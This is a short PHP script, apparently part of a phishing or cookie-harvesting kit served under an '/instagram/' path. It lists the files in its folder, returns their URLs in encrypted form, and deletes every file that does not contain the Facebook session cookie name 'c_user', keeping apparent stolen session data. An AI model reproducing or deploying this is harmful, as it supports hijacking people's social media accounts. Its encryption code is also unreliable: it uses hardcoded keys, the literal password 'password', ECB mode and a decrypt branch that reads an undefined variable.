<?php
header('Content-Type: application/json');
$js = array();

function encIT( $q ) {
    $cryptKey  = 'qJB0rGtIn5UB1xG03efyCp';
    $qEncoded      = base64_encode( mcrypt_encrypt( MCRYPT_RIJNDAEL_256, md5( $cryptKey ), $q, MCRYPT_MODE_CBC, md5( md5( $cryptKey ) ) ) );
    return( $qEncoded );
}

function decIT( $q ) {
    $cryptKey  = 'qJB0rGtIn5UB1xG03efyCp';
    $qDecoded      = rtrim( mcrypt_decrypt( MCRYPT_RIJNDAEL_256, md5( $cryptKey ), base64_decode( $q ), MCRYPT_MODE_CBC, md5( md5( $cryptKey ) ) ), "\0");
    return( $qDecoded );
}

function encx($t,$str){
$string_to_encrypt=$str;
$password="password";
if (strpos($t, "encrypt") !== false){
$encrypted_string=openssl_encrypt($string_to_encrypt,"AES-128-ECB",$password);
return $encrypted_string;
} else if (strpos($t, "decrypt") !== false){
$decrypted_string=openssl_decrypt($encrypted_string,"AES-128-ECB",$password);
return $decrypted_string;
} else {
return false;
}
}

if ($handle = opendir('.')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {
          if (strpos($entry, ".php") === false){
$ou='http://'.$_SERVER["HTTP_HOST"].'/instagram/'.basename(__DIR__)."/$entry";
$ou=encx("encrypted", $ou);
            $js[]=encIT($ou);

$c = file_get_contents($entry);
if (strpos($c, "c_user") === false){
 @unlink($entry);
}

          }
        }
    }

    closedir($handle);
}


echo json_encode($js, JSON_PRETTY_PRINT);